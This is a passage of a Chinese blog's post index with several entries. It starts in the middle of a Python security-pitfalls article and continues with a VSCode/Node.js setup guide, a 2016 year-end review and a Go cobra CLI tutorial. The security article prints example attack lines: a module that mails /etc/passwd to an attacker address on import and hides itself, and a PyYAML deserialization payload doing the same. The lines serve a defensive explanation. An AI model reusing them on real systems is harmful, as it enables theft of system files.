如果程序员依赖于双下划线属性来在他们的代码中做出重要决定，而不关注私有属性的不对称行为，那么这些小技巧会变成安全漏洞 模块执行语句实际上会导致导入的模块中的代码的执行，这一事实并不明显。这就是为什么甚至导入不可信模块或包是有风险的。导入像这样的简单模块可能会导致不愉快的结果：1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined 猴子补丁运行时修改 Python 对象属性的过程称之为猴子补丁 ( monkey patching)。作为动态语言， Python 完全支持运行时程序自省和代码突变。一旦以某种方式导入了一个恶意模块，那么任何现有的可变对象可被不知不觉地在没有程序员同意的情况下被打猴子补丁。攻击者可以利用 Python 垃圾回收器 ( gc.get_objects())来掌握现有的所有对象，并黑进它们中任意一个。 Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可以通过依靠改变活动对象的类型来令人绝望地把事情搞砸：12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; 对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。 通过subprocess进行shell注入以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017年 1月10日 星期二 13时11分53秒 CST0&gt;&gt;&gt; 但有一个陷阱！要利用UNIX shell服务，例如命令行参数扩展，call函数的shell关键字参数应该设置为True。然后原样传递call函数的第一个参数给系统shell，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... 显然，将shell关键字保持默认值False，并且提供命令及其参数的数组给subprocess函数，不要为外部命令执行调用UNIX shell，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被shell解析或展开。如果应用的本质决定了使用UNIX shell服务，那么清理一切到 subprocess的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的shlex.quote函数来进行shell转义。 序列化-pyYAML作为一个流行的配置文件格式，YAML不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上Python的YAML默认实现—-PyYAML让反序列化看起来非常无辜：1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; 而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库]]></content>
      <categories>
        <category>开发语言</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python_tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用VSCode快速搭建NodeJS开发环境]]></title>
    <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
    <content type="text"><![CDATA[文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。 VSCode简介VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。 安装VSCode可以通过官方下载, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用国内镜像,直接下mac版本的安装包，安装。 运行在VS Code中，我们可以非常方便地运行JavaScript文件。 VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。 假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript 然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的JavaScript in VS Code 智能提示因为之前微软推出了typescript语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。 这个功能理所应当也被vscode继承了，但是现在tsd项目已经过期了，接过这个接力棒的是typings 因此我们将通过Typings来实现JavaScript智能提示功 注意事项 安装NPM NPM是和Node.js一起安装的，如果你想使用NPM的话，那么你应该先安装Node.js Typings vs TSD Typings作为TSD的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它1npm rm -g tsd CNPM 在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的NPM镜像，关于淘宝NPM镜像的使用方法可以参考淘宝 NPM 镜像 使用下面的命令来进行安装和使用12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa 安装Typings我们通过cnpm来安装typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 配置智能提示安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看typings github 使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：12typings install dt~node --global --savetypings install lodash --save 这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：12345678910111213 maojun@maojun-mbp$ tree ..├── typings│ ├── globals│ │ └── node│ │ ├── index.d.ts│ │ └── typings.json│ ├── index.d.ts│ └── modules│ └── lodash│ ├── index.d.ts│ └── typings.json└── typings.json 这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:1typings search exampleName 启动智能提示配置好了类型接口后，可以通过两种方式来启动提示功能： 文件头加注释 1/// &lt;reference path="./typings/index.d.ts" /&gt; 在目录(在这里是NodeSnippet文件夹中)增加一个名为jsconfig.json的空文件 更多jsconfig.json文件的内容可以参考： JavaScript in VS Code 这样我们写代码的时候就有智能提示功能了， 效果如下: 调试如何调试写好了的JS程序喃？ 用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。 关于Debug的细节，请参考Debugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "启动程序", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "附加到进程", "port": 5858 &#125; ]&#125; 效果如下:]]></content>
      <categories>
        <category>开发语言</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016总结与2017计划]]></title>
    <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
    <content type="text"><![CDATA[孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。 记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。 转瞬即逝的20162016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。 2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。 工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。 还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。 瞬息万变的2017变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。 我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单: Python提升书单(今年主力) 基础回过 廖雪峰官网 Think Python 2ed 中译版精校 PDF 电子书 进阶深 python3-cookbook 电子书Python高手之路 常见的一些代码实现 python实例手册 网站上的文章 设计模式 快速版大话设计模式 一些最新的例子 精通Python设计模式 数据结构与算法 快速阅读总结 电子书：Data Structures and Algorithms with Python-2015 源码阅读 Django Class Based View Flask 源码阅读 Openstack KeyStone 源码阅读 理解Python解释器 用Python实现一个Python解释器 Golang提升书单 回过基础： Go Web 编程 Go入门指南 JavaScript提升书单 回过基础： 廖雪峰官网 阮一峰的javascript教程 ECMAScript 6 入门 除了技术, 还应该有生活。而生活就是: 赶紧把账还完]]></content>
      <categories>
        <category>杂谈</category>
        <category>年终总结</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何使用golang编写漂亮的命令行工具]]></title>
    <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
    <content type="text"><![CDATA[无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra cobra简介Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。它提供的功能有： 简易的子命令行模式，如 app server， app fetch等等 完全兼容posix命令行模式 嵌套子命令subcommand 支持全局，局部，串联flags 使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname 如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server 自动生成commands和flags的帮助信息 自动生成详细的help信息，如app help 自动识别-h，–help帮助flag 自动生成应用程序在bash下命令自动完成功能 自动生成应用程序的man手册 命令行别名 自定义help和usage信息 可选的紧密集成的viper apps 从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大 安装安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra 安装完成后可以看到cobra的一些帮助信息1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. 使用接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI 初始化我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` 这个命令会帮你生成这样一个框架代码123456 maojun@maojun-mbp$ tree demodemo├── LICENSE├── cmd│ └── root.go└── main.go 简单的CLI在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name 接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：123456789maojun@maojun-mbp$ tree ..├── LICENSE├── cmd│ └── root.go├── main.go└── simple ├── simple.go └── simple_test.go 这里仅仅实现一个print作为样例,因此simple.go是这样实现的123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; 接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。 在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()] 在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute() 而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了 这里做了几点修改 RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口 cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法 最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper” 最终这个root.go是这样的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; 最后测试下是不是我们想要的效果1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 带子命令的CLI对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. 支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go 注释掉root.go那些不需要的地方, 然后修改生成的test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; 最后测试下是不是我们想要的效果 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 命令行补全，man这些可以自己手动测试]]></content>
      <categories>
        <category>开发语言</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>cobra</tag>
      </tags>
  </entry>
</search>
